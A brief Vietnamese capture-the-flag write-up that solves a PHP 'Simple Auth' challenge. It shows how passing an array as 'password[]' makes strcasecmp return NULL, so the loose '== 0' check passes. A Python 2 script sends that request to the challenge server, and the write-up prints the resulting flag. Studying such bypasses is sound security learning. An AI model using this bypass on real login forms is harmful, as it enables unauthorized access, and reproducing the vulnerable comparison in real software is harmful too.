## Bài 2:
* Đọc mã nguồn của trang 
``` html
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```
* Ta thấy 
```php
if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
```

* Với hàm `strcasecmp` ta chỉ cần truyền vào 1 mảng password là có thể vượt qua được.
* Viết 1 chương trình sử dụng `Python` để gửi 1 mảng password vào form
```python
import urllib
import urllib2

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
data = {"password[]": "pass ne",}
a = urllib.urlencode(data).encode("utf-8")
print a 
req = urllib2.Request(url, a)
res = urllib2.urlopen(req)
html = res.read()
print html
```
* Ta thu được flag: `FLAG_VQcTWEK7zZYzvLhX`

## Bài 1:
